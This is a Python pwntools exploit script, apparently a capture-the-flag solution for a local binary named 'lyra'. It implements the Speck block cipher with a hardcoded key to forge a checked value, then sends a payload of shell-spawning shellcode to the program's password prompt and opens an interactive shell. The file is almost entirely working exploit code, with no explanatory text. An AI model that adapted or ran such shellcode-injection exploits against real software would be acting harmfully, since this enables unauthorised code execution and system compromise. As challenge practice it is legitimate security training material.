from pwn import *

context.arch = 'amd64'

ACTUAL_KEY = [0x85615CE70BA97239, 0xAF6F5627BC993A1E]

class Speck:
  KEY_SIZE = 16
  BLOCK_SIZE = 16
  ROUNDS = 32

  def __init__(self, key: bytes):
    self.subkeys = self.key_schedule(key)

  @staticmethod
  def forward(x, y, k):
    x = ror(x, 8, 64)
    x = (x + y) % 2**64
    x ^= k
    y = rol(y, 3, 64)
    y ^= x
    return x, y
  
  @staticmethod
  def backward(x, y, k):
    y ^= x
    y = ror(y, 3, 64)
    x ^= k
    x = (x - y) % 2**64
    x = rol(x, 8, 64)
    return x, y

  def key_schedule(self, key: bytes):
    assert len(key) == self.KEY_SIZE
    A, B = (u64(key[:8]), u64(key[8:]))
    result = []
    for i in range(self.ROUNDS):
      result.append(A)
      B, A = self.forward(B, A, i)
    return result

  def encrypt_block(self, block: bytes):
    assert len(block) == self.BLOCK_SIZE
    x, y = (u64(block[:8]), u64(block[8:]))
    for i in range(self.ROUNDS):
      y, x = self.forward(y, x, self.subkeys[i])
    return p64(x) + p64(y)

  def decrypt_block(self, block: bytes):
    assert len(block) == self.BLOCK_SIZE
    x, y = (u64(block[:8]), u64(block[8:]))
    for i in range(self.ROUNDS - 1, -1, -1):
      y, x = self.backward(y, x, self.subkeys[i])
    return p64(x) + p64(y)

def sanity():
  speck = Speck(b"\x00" * 16)
  assert speck.decrypt_block(speck.encrypt_block(b"\x00"*16)) == b"\x00"*16
  speck = Speck(bytes(range(16)))
  assert speck.encrypt_block(b" made it equival") == bytes([0x18, 0x0d, 0x57, 0x5c, 0xdf, 0xfe, 0x60, 0x78, 0x65, 0x32, 0x78, 0x79, 0x51, 0x98, 0x5d, 0xa6])

sanity()

cipher = Speck(p64(ACTUAL_KEY[0]) + p64(ACTUAL_KEY[1]))
payload = flat({
  0: asm(shellcraft.sh()),
  128: cipher.decrypt_block(b"\x00"*16),
}, length=255)
assert b"\n" not in payload

# sys.stdout.buffer.write(payload)

r = process("./lyra")
r.recvuntil(b"Input password: ")
time.sleep(3)
r.sendline(payload)
r.interactive()
